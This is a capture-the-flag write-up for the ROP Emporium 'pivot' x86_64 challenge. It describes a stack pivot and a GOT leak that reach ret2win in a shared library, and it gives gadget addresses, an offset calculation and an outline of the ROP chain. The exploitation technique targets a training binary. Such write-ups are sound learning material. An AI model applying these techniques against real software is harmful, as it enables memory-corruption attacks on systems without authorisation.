# Pivot - ROP Emporium (x86_64)

## Challenge
Call `ret2win()` in `libpivot.so` - but it's not imported by the binary.

## The Problem
- Stack overflow has limited space for ROP chain
- `ret2win` is in a shared library (ASLR randomized)
- Only `foothold_function` is imported from libpivot

## Solution: Stack Pivot + GOT Leak

### Key Insight
Binary provides a "pivot address" where we can place a larger ROP chain. Use the small stack overflow to redirect RSP there.

### Gadgets
| Gadget | Address | Purpose |
|--------|---------|---------|
| `pop rax; ret` | 0x4009bb | Load values into RAX |
| `xchg rsp, rax; ret` | 0x4009bd | Pivot stack |
| `mov rax, [rax]; ret` | 0x4009c0 | Dereference GOT |
| `pop rbp; ret` | 0x4007c8 | Load offset |
| `add rax, rbp; ret` | 0x4009c4 | Calculate ret2win |
| `call rax` | 0x4006b0 | Jump to ret2win |

### Offset Calculation
```
ret2win:           0xa81
foothold_function: 0x96a
offset:            0xa81 - 0x96a = 0x117
```

### Exploit Flow
```
1. Stack Smash (small):
   pop rax; ret       -> rax = pivot_addr
   xchg rsp, rax; ret -> RSP pivots to new location

2. ROP Chain (at pivot address):
   call foothold@plt  -> populates GOT entry
   pop rax            -> rax = foothold@got (0x601040)
   mov rax, [rax]     -> rax = resolved address
   pop rbp            -> rbp = 0x117
   add rax, rbp       -> rax = ret2win address
   call rax           -> FLAG!
```

## Key Addresses
- `foothold_function@plt`: 0x400720
- `foothold_function@got`: 0x601040
